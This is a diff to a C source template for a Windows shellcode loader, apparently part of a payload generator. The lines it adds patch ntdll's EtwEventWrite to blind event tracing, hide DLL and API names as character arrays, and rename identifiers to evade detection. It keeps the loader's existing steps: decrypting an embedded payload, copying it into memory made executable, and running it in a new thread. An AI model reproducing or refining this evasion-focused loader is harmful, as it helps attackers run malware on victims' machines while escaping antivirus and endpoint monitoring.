@@ -9,14 +9,14 @@
 #include <string.h>
 #include <tlhelp32.h>
 
-LPVOID (WINAPI * Virt_Alloc)(  LPVOID lpAddress, SIZE_T dwSize, DWORD  flAllocationType, DWORD  flProtect);
+LPVOID (WINAPI * Vor_AlL)(  LPVOID lpAddress, SIZE_T dwSize, DWORD  flAllocationType, DWORD  flProtect);
 
 char XOR_VARIABLE []= "XOR_KEY";
 
 unsigned char Random9 []= VIRALO}; 
 
 
-int Random1(char * different, unsigned int different_len, char * key, size_t keylen) {
+int Random1(char * difern, unsigned int difern_len, char * key, int keylen) {
         HCRYPTPROV hProv;
         HCRYPTHASH hHash;
         HCRYPTKEY hKey;
@@ -34,7 +34,7 @@ int Random1(char * different, unsigned int different_len, char * key, size_t key
                 return -1;
         }
         
-        if (!CryptDecrypt(hKey, (HCRYPTHASH) NULL, 0, 0, different, &different_len)){
+        if (!CryptDecrypt(hKey, (HCRYPTHASH) NULL, 0, 0, difern, &difern_len)){
                 return -1;
         }
         
@@ -46,13 +46,13 @@ int Random1(char * different, unsigned int different_len, char * key, size_t key
 }
 
 
-void RandomA(char * tada, int tada_len, char * XOR_VARIABLE, size_t XOR_VARIABLE_len) {
+void RandomA(char * tadaks, int tadaks_len, char * XOR_VARIABLE, int XOR_VARIABLE_len) {
         int r;
         r = 0;
-        for (int i = 0; i < tada_len; i++) {
+        for (int i = 0; i < tadaks_len; i++) {
                 if (r == XOR_VARIABLE_len - 1) r = 0;
 
-                tada[i] = tada[i] ^ XOR_VARIABLE[r];
+                tadaks[i] = tadaks[i] ^ XOR_VARIABLE[r];
                 r++;
         }
 }
@@ -69,31 +69,43 @@ int main(void) {
 	unsigned char Random3[] = PAYVAL
 	unsigned int Random7_len = sizeof(Random3);
 	
+	unsigned char snT[]= {'n','t','d','l','l','.','d','l','l', 0x0};
+           unsigned char ETwr[]= {'E','t','w','E','v','e','n','t','W','r','i','t','e', 0x0};
+           unsigned char skEr[]= {'k','e','r','n','e','l','3','2','.','d','l','l', 0x0};   
+
 	int pido = 0;
-        HANDLE hProc = NULL;	
+           HANDLE hProc = NULL;	
 	
-	
+           void * addr = GetProcAddress(GetModuleHandle(snT), ETwr);
+           VirtualProtect(addr, 4096, PAGE_READWRITE, &oldprotect);
+
+        #ifdef _WIN64
+        memcpy(addr, "\x48\x33\xc0\xc3", 4);            
+        #else
+        memcpy(addr, "\x33\xc0\xc2\x14\x00", 5);
+        #endif  
+
+        VirtualProtect(addr, 4096, PAGE_EXECUTE_READWRITE, &oldprotect);
+
+
 	strrev(Random3);
 	FreeConsole();
 	strrev(Random3);
 
 	RandomA((char *) Random9, sizeof (Random9), XOR_VARIABLE, sizeof(XOR_VARIABLE));
-        Virt_Alloc= GetProcAddress(GetModuleHandle("kernel32.dll"), Random9);
+           Vor_AlL= GetProcAddress(GetModuleHandle(skEr), Random9);
 
-	Random6_mem = Virt_Alloc(0, Random7_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+	Random6_mem = Vor_AlL(0, Random7_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
 
 	Random1((char *) Random3, Random7_len, Random2, sizeof(Random2));
-		
 
 	RtlMoveMemory(Random6_mem, Random3, Random7_len);
-	
 
 	Random8 = VirtualProtect(Random6_mem, Random7_len, PAGE_EXECUTE_READWRITE, &oldprotect);
 
-	if ( Random8 != 0 ) {
-			th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE) Random6_mem, 0, 0, 0);
-			WaitForSingleObject(th, -1);
-	}
+	th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE) Random6_mem, 0, 0, 0);
+	WaitForSingleObject(th, -1);
+	
 	
 	return 0;
 }
